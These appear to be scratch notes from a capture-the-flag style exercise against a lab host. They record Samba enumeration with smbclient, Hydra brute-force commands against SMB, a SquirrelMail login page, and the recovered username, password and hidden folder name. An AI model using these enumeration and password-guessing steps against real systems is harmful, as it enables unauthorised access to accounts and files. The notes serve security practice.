445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)


smbclient -L //10.113.130.138 -N
(lists clients)

http://10.113.130.138/squirrelmail/src/login.php


hydra -l [username] -P [your_password_list.txt] [target_ip] smb -V -f

hydra -l skynet -P Downloads/skynet.txt [target_ip] smb -V -f

works http://10.113.130.138/squirrelmail/
CVE 2025 30090
 
milesdyson
cyborg007haloterminator

smbclient //10.113.130.138/milesdyson -U milesdyson --option="client min protocol=NT1"
)s{A&2Z=F^n_E.B`

smbclient //10.113.130.138/milesdyson -N -c 'get notes/important.txt -' | cat

secret folder : 45kra24zxs28v3yd

)s{A&2Z=F^n_E.B`